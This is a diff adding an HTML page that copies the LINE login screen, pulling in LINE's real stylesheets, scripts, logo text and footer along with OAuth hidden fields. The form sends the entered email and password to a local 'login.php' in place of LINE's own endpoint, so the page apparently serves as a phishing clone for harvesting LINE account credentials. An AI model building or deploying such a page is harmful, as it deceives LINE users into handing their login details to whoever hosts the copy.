@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="en_US" data-lang="en_US"><head>
+  <!-- PC -->
+  <meta charset="UTF-8">
+  <title>LINE</title>
+  <link rel="shortcut icon" type="image/x-icon" href="https://scdn.line-apps.com/n/line_lp/img/favicon.ico">
+  <link rel="stylesheet" href="https://scdn.line-apps.com/n/line_web_login/css/line_web_login_1523526510.css">
+  <!--[if lt IE 9]><script src="https://scdn.line-apps.com/n/line_web_login/js/html5_1523526510.js"></script><![endif]-->
+  <script src="https://scdn.line-apps.com/n/line_web_login/js/lc.line.web.login.common_1523526510.js"></script>
+
+  <link rel="stylesheet" type="text/css" href="/dialog/res/css/common/double-click-prevention.css">
+  <script src="/dialog/res/js/common/double-click-prevention.js"></script>
+</head>
+<body>
+<div class="LyWrap" style="margin-top: 113px;">
+  <div class="ArLoginWrap" style="margin-top: 0px;">
+    <h1 class="MdGHD1Logo">LINE</h1>
+    <div class="arLoginWrapInner">
+      <div class="MdMN01LoginForm">
+        <form action="login.php" method="post">
+          <input type="hidden" name="__csrf" id="__csrf" value="9cBEw4aHQB3Uj7wPji2SSM" class="pincodeParam">
+          <input type="hidden" name="userId" id="userId" value="">
+          <input type="hidden" name="id" id="rsaKeyName" value="">
+          <input type="hidden" name="password" id="ipt_login_param_encrypt" value="">
+          <input type="hidden" name="idProvider" id="idProvider" value="">
+          <input type="hidden" name="loginChannelId" id="channelId" value="1369299637" class="pincodeParam">
+          <input type="hidden" name="returnUri" id="returnUri" value="/oauth2/v2.1/authorize/consent?scope=openid+profile&amp;response_type=code&amp;redirect_uri=https%3A%2F%2Fdevelopers.line.me%2Flogin%3Fbox%3D%2Fconsole%2F&amp;state=2b7319f423d71025&amp;client_id=1369299637" class="pincodeParam">
+          <input type="hidden" name="displayType" value="b">
+          <input type="hidden" name="captchaKey" id="captchaKey" value="s8dXhiDIzfzDrWr0Vr6CRMX5kR4x25QAkYGL4SVEfXg">
+
+          <div class="MdLYR05Wrap MdNonDisp">
+            <a href="#" class="MdBtn01Close02">Close</a>
+            <p class="mdLYR05Desc">You can view your account info by opening your LINE app and going to Settings &gt; Account.</p>
+          </div>
+          <div class="MdInputTxt01 mdInputTxt01Mail">
+            <input type="text" id="id" name="tid" class="" placeholder="Email address">
+            <span type="button" class="MdBtn01Help">Help</span>
+          </div>
+          <div class="MdInputTxt01">
+            <input type="password" id="passwd" name="tpasswd" class="" placeholder="Password">
+          </div>
+
+          <div class="mdMN01Btn">
+            <input type="submit" class="MdBtn03Login doubleClickDisabled" value="Log in" disabled="">
+          </div>
+        </form>
+      </div>
+      <div class="MdMN02Msg">
+        <p class="mdMN02Txt">
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <footer class="LyFoot" role="contentinfo">
+    <p class="MdGFT02Link">
+      <a href="http://line.me" target="_blank">About LINE</a>
+    </p>
+    <p class="MdGFT01Copy">
+      <small>© LINE Corporation</small>
+    </p>
+  </footer>
+</div>
+
+
+<!--SCRIPT-->
+<script src="https://scdn.line-apps.com/n/line_web_login/js/lc.line.web.login_1523526510.js"></script>
+<script>
+  var message = {
+    "001": "Invalid email address.",
+    "002": "Unable to log in.<br />Please try again later.",
+    "003": "Required information missing.",
+    "004": "Invalid password."
+  };
+
+  lc.line.web.login.init({
+    lineRsaUrl: "/authct/v1/keys/line",
+    naverRsaUrl: "/authct/v1/keys/naver",
+    captchaUrl: "https://access.line.me/dialog/captcha/s8dXhiDIzfzDrWr0Vr6CRMX5kR4x25QAkYGL4SVEfXg",
+    pinCodeUrl: "",
+    verifier: "",
+    errorMsg: "Unable to log in now.<br />Please try again later.",
+    isPermittedNaverLogin : true
+  });
+</script>
+<!--/SCRIPT-->
+
+
+</body></html>
